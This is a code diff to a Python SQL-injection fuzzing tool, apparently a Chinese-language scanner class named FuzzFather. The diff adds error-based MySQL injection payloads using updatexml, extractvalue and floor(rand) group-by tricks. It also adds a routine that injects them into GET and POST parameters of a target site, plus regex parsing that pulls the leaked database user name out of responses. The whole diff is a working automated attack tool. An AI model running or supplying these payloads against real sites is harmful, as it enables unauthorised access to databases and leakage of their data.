@@ -3,6 +3,7 @@ import requests
 from termcolor import cprint
 import random
 from Libs.waf import Waf
+import re
 
 class FuzzFather:
     def __init__(self):
@@ -31,6 +32,22 @@ class FuzzFather:
                              ['{``1=1}', '{``1=2}'], ['1', '0'], ['2<<1', '0<<2'],
                              ['1|1', '0|0'], ['1||1', '0||0'],
                              ['1&&1', '0&&1'], ['1^1', '1^0']]
+
+        # 报错payload
+        self.error = [
+            ' and (select 1 from(select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.character_sets group by x)a)',
+            ' and (select 1 from (select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))b from information_schema.tables group by b)a)',
+            ' union select count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.tables group by x ',
+            ' and (updatexml(1,concat(0x5e5e5e,(select user()),0x5e5e5e),1))',
+            ' and (extractvalue(1,concat(0x5e5e5e,(select user()),0x5e5e5e)))'
+            # ' and geometrycollection((select * from(select * from(select user())a)b))'
+            # ' and multipoint((select * from(select * from(select user())a)b))',
+            # ' and polygon((select * from(select * from(select user())a)b))',
+            # ' and multipolygon((select * from(select * from(select user())a)b))',
+            # ' and linestring((select * from(select * from(select user())a)b))',
+            # ' and multilinestring((select * from(select * from(select user())a)b))',
+            # ' and exp(~(select * from(select user())a))'
+        ]
 
         self.num = 0
         self.RedPayloads, self.YellowPayloads, self.BluePayloads, self.GreenPayloads, self.wafPayloads = [], [], [], [], []
@@ -62,6 +79,9 @@ class FuzzFather:
             type_inject = '数字型'
         elif func == 'char_payload':
             type_inject = '字符型'
+        elif func == 'error_payload':
+            type_inject = '报错型'
+
 
         waf_exist = self.waf.detect(text=text1)
         # 检测是否触发网站的waf
@@ -71,6 +91,17 @@ class FuzzFather:
             self.ret['type'] = type_inject
             self.ret['payload'] = waf_exist['payload']
             self.ret['waf'] = waf_exist['wafName']
+            cprint(self.ret, 'red')
+            self.Payloads.append(self.ret)
+
+        elif '^^^' in text1:
+            cmp = '[\^][\^][\^](.*)[\^][\^][\^]'  # ^是元字符，所以要在方括号里并用斜杠去匹配^
+            user = re.search(cmp, text1).group(1)
+            self.ret['success'] = 'True'
+            self.ret['type'] = type_inject
+            self.ret['payload'] = payload1
+            self.ret['user'] = user
+            self.ret['waf'] = 'None'
             cprint(self.ret, 'red')
             self.Payloads.append(self.ret)
 
@@ -127,8 +158,8 @@ class FuzzFather:
     # 第一功能探测是否存在注入：单引号，双引号，反斜杠，负数，特殊字符，and，or，xor！！！
     def test_sql(self, url, params, headers, standard_length, type):
         '''
-        :param url: 请求的路径
-        :param params: 是GET/POST型参数
+        :param url: 请求的路径,GET型有参数，POST型无参数
+        :param params: 是POST型参数
         :param headers: 请求头
         :param standard_length: 正常包的响应包长度
         :param type: GET/POST
@@ -252,5 +283,35 @@ class FuzzFather:
                                payload_length2=payload_length2, payload1=payload1, payload2=payload2,
                                text1=text1, text2=text2, num=self.num, func='char_payload')
 
+                    self.num += 1
+
+    # 第四功能：请求报错payload
+    def error_payload(self, url, params, headers, standard_length, type):
+        cprint('检测报错型注入：↓', 'red')
+        paramsList = params.split('&')
+        for i in range(len(paramsList)):
+            for each in ['', '"', "'"]:
+                for each_error in self.error:
+                    note = random.choice(['--+', '%23'])
+                    payload_param = paramsList[i] + '{}{}{}'.format(each, each_error, note)  # 构造其中一个参数的payload
+                    if type == 'get':  # GET
+                        payload = url.replace(paramsList[i], payload_param)  # 构造好的参数payload替换掉原先的参数
+                        text, payload_length = self.text_length_return(url=payload, headers=headers,
+                                                                       post_data=None)  # payload_length1是请求带payload的响应包的长度
+
+                    else:  # POST
+                        payload = params.replace(paramsList[i], payload_param)  # 构造好的参数payload替换掉原先的参数
+                        text, payload_length = self.text_length_return(url=url, headers=headers,
+                                                                       post_data=payload)  # payload_length1是请求带payload的响应包的长度
+                    print('[:{}:] 测试 : [{}] {}'.format(self.num, payload_length, payload))
+
+                    # 当请求错误的时候，payload_length1的值为0，然后退出该循环
+                    if payload_length == 0:
+                        cprint('[连接错误] : {}'.format(payload), 'red')
+                        continue
+
+                    self.check(standard_length=standard_length, payload_length1=payload_length,
+                               payload_length2=payload_length, payload1=payload, payload2=payload,
+                               text1=text, text2=text, num=self.num, func='error_payload')
                     self.num += 1
 
